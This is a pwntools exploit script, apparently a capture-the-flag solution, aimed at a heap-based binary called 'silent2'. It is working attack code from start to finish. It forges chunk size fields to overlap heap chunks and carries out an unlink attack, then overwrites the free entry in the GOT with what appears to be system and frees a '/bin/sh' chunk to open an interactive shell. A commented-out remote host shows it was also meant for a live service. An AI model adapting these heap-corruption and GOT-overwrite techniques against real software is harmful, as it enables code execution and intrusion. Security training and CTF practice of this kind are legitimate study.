#coding:utf-8
from pwn import *
import os

context.arch = 'amd64'
context.log_level = 'debug'

#io=remote('39.107.32.132',10001)
io = process('./silent2')
elf = ELF('./silent2')

def alloc(size,content):
    io.sendline('1')
    io.sendline(str(size))
    io.send(content)

def write(index,content,buf):
    io.sendline('3')
    io.sendline(str(index))
    io.send(content)
    io.send(buf)

def delete(index):
    io.sendline('2')
    io.sendline(str(index))


if __name__ == '__main__':
    pause()
    alloc(0x108,'0'*0x107)#0
    alloc(0x108,'1'*0x107)#1
    alloc(0x108,'2'*0x107)#2
    alloc(0x108,'3'*0x107)#3
    alloc(0x108,'/bin/sh\x00'+'\n')#4
    pause()
    delete(1)
    delete(2)
    delete(3)
    pause()
    payload = '5'*0x108+p64(0x151)
    payload += '5'*0x140+p64(0x150)+p64(0xd1)
    payload = payload.ljust(0x31f,'5')
    alloc(0x320,payload)#5
    pause()
    delete(2)
    delete(1)
    pause()
    alloc(0x220,'6'*0x107+'\n')#6a
    pause()
    payload = 'a'*0x118+p64(0x101)+p64(0x6020c0)+p64(0x6020c8)
    payload = payload.ljust(0x13f,'a')
    alloc(0x140,payload)#7
    pause()
    delete(4)
    pause()
    #0x602018 400730
    write(3,'\x18\x20\x60\x00','\n')
    pause()
    write(0,'\x30\x07\x40\x00\x00\x00'+'\n','\n') 
    pause()
    delete(4)
    pause()
    io.interactive()
